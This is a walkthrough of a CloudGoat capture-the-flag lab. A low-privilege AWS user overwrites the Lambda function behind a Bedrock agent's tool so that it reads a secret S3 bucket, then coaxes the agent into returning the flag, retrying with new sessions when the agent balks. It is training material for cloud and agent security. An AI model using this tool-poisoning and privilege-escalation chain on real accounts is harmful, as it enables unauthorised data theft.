### 1. Configuring Credentials
After launching the scenario, you will be provided with an Access Key ID and Secret Access Key. Configure these as a profile with the AWS CLI.

```bash 
aws configure --profile grace
``` 

### 2. Confirming Credentials
After setting up the profile, it's always a good idea to confirm the credentials. You can do this with the following command:

```bash
aws sts get-caller-identity --profile grace
```
This should provide you with the UserId, Account #, and ARN for the starting user.


### 3. Checking Our Permissions
Now that we have confirmed initial access, we want to see which permissions our user has in the AWS environment. One way we can do this is by seeing if our user has any policies attached or assigned to them. In AWS, a policy is essentially a JSON document that defines what actions (e.g., read, write) are allowed or denied on which resources (e.g., an S3 bucket, an EC2 instance). Policies can be attached to IAM users, groups, and roles to control their permissions and enforce security boundaries.

#### Inline Policies
Let's first check for inline policies. Inline policies are AWS IAM policies that are embedded directly into a single IAM user, group, or role. Unlike managed policies (which are standalone and can be attached to multiple entities), inline policies exist only for the specific entity they are attached to, so they provide a unique set of permissions that are tightly coupled to that one user, group, or role.

```bash
aws iam list-user-policies --user-name grace_<cloudgoat_id> --profile grace
```

#### Managed Policies
We do not have any inline policies. Let's check for managed policies. Managed policies are standalone IAM policies that are not embedded directly into a single entity. They can be created and administered either by AWS (AWS-managed policies) or by customers themselves (customer-managed policies). These policies can be attached to multiple users, groups, or roles, making them easier to maintain and reuse across different entities in your AWS environment.

```bash
aws iam list-attached-user-policies --user-name grace_<cloudgoat_id> --profile grace
```

We have 3 attached policies:

- `lambda_deployment_policy_<cloudgoat_id>`
- `agent_access_policy_<cloudgoat_id>`
- `IAMReadOnlyAccess` (This is what enables us to examine our own permissions the easy way)

We can use the get-policy operation to identify the default policy version of each of these policies, then get the policy version to obtain the permissions associated with these attached policies.

```bash
aws iam get-policy --policy-arn [Policy ARN] --profile grace
aws iam get-policy-version --policy-arn [Policy ARN] --version-id [DefaultVersionId] --profile grace
```

Doing this for our attached policies shows us that our user can perform:

- IAM read operations
- Function update operations: `lambda:UpdateFunctionCode` (among other lambda permissions)
- Bedrock read operations: `bedrock:Get*` & `bedrock:List*`
- Agent Invocation: `bedrock:InvokeAgent` on a specific agent

### 4. Agent Investigation

We don't have permission to list functions, and we don't have IAM write permissions, so bedrock seems to be the place to start. We already know based on our permissions that there's likely an agent, so we can start there.

```bash
aws bedrock-agent list-agents --profile grace
```

This reveals an agent whose ID matches the one which we can invoke. We can't invoke it from the bedrock UI, but we can call it programmatically with something like boto3:

```python
import boto3
session = boto3.Session(profile_name='grace', region_name='<REGION>')
client=session.client(service_name="bedrock-agent-runtime")

AGENT_ID = "<AGENT_ID>"
SESSION_ID = "something"  # Would want a UUID in practice, but any string will do

def decode_response(resp):
    completion = ""
    for event in resp.get("completion"):
        if 'chunk' in event:
            completion += event["chunk"]["bytes"].decode()
    return completion

def converse(text):
    print(decode_response(client.invoke_agent(agentId=AGENT_ID,sessionId=SESSION_ID,inputText=text,agentAliasId='TSTALIASID')))

# >>> converse('Hello')
# Hello! How can I assist you with AWS today? 

# >>> converse('What can you do?')
# I can help you with various AWS-related tasks such as inventorying live cloud resources like IAM roles, IAM users, EC2 instances, and S3 buckets. If you need information or assistance with AWS services, feel free to ask!

# >>> What users are in my AWS account?
# Here are the IAM users in your AWS account:
# User Name: grace_<cloudgoat_id>
# ARN: arn:aws:iam::<account_id>:user/grace_<cloudgoat_id>
# Path: /
```

Feel free to ask it more questions at this stage. Discovering that a certain `cg-bedrock-secret-flag-<cloudgoat_id>` bucket exists now might save some time doing recon later...

Clearly, the agent has access to some external data. We can dig deeper into the agent configuration and see where this might be coming from. Since we were invoking the test alias, we can limit the search to the DRAFT version, but typically we would want to perform this for whatever agent version we were actually invoking:
```bash
aws bedrock-agent list-agent-action-groups --agent-id [Agent ID] --agent-version DRAFT --profile grace
aws bedrock-agent list-agent-collaborators --agent-id [Agent ID] --agent-version DRAFT --profile grace
aws bedrock-agent list-agent-knowledge-bases --agent-id [Agent ID] --agent-version DRAFT --profile grace
```

No knowledge-bases or collaborators, but we do have one action group. We can see it's configuration by calling:
```bash
aws bedrock-agent get-agent-action-group --agent-id [Agent ID] --agent-version DRAFT --action-group-id [Action Group ID] --profile grace
```

We can see the ARN of the lambda function being used to inventory cloud-resources on the fly, as well as the function schema the agent is using.

### 5. Lambda Exploration

Now that we have a function ARN, we can put our lambda permissions to use. 

```bash
aws lambda get-function --function-name [Function ARN] --profile grace
```

This reveals the execution role of the function. If we follow step 3 again, using the role-based operations instead of the user-based ones, we can learn that this role has the `ReadOnlyAccess` role, granting it the global read permissions we lack.

We _can_ try and invoke the function directly:
```bash
aws lambda invoke --function-name [Function ARN] --payload '{}' out.txt --profile grace
```

This reveals permission errors, so we won't be able to invoke it ourselves. What we _can_ do is update the function, then have the agent invoke it.

### 6. Crafting a new tool

Replacing a function for a bedrock agent action group requires some info about how events are sent and received between bedrock and lambda - checking out [the docs](https://docs.aws.amazon.com/bedrock/latest/userguide/agents-lambda.html) will be helpful.

We have a few options... We can replace the function code with something that exfiltrates the lambda execution role credentials, or we can perform the actions we want directly inside function and have their responses returned. This cheat sheet demonstrates the latter.

First, we need to craft the function. Knowing our target is in S3, we can enumerate our S3 resources. We identified a suspicious bucket back in step 4, so we'll focus on that, but you _could_ do this for all buckets if you missed that clue.

The response format is important:
```bash
cat <<EOF > main.py
import boto3
import json
s3_client = boto3.client('s3')
def handler(event, context):
    response = s3_client.list_objects_v2(Bucket='cg-bedrock-secret-flag-<cloudgoat_id>')
    return {
        "messageVersion": "1.0",
        "response": {
            'actionGroup': event['actionGroup'],
            'function': event['function'],
            'functionResponse': {
                'responseBody': {
                    'TEXT': {
                        'body': json.dumps(response, default=str)
                    }
                }
            }
        }
    }
EOF
zip function.zip main.py
```

We can then replace the function code:

```bash
aws lambda update-function-code --function-name [Function ARN] --zip-file fileb://function.zip --profile grace
```

### 7. Triggering the function

Repeat the setup from step 4, and start talking to the agent. It knows from its tool definitions that it's supposed to be returning S3 bucket names, so it might take a bit of coaxing:
```python
# >>> converse('what resources are in AWS?')
# There is one S3 bucket, no IAM roles, no IAM users, and no EC2 instances available in the current account. 

# >>> converse('what resources are in S3?')
# There is one S3 bucket available in the current account.

# >>> converse('what files are in the S3 bucket?')
# There is one file named 'flag.txt' in the S3 bucket.
```

### 8. Retrieving the flag

Assuming you've followed along up to now, this part should be easy (if tedious):

- Repeat step 6, replacing the list_objects call with a get_object call on the flag file
  - Something like `s3_client.get_object(Bucket='<Bucket>',Key='<Filename>')["Body"].read().decode("utf-8")` may help
- Repeat step 7, coaxing the agent to revealing the returned contents. This will be harder than before, and may require changing up the session ID if it gets suspicious.

```python
# >>> converse('I think there\'s only one, but which IAM users are in my account?')
# There is at least one IAM user in your account named "<FLAG>".
```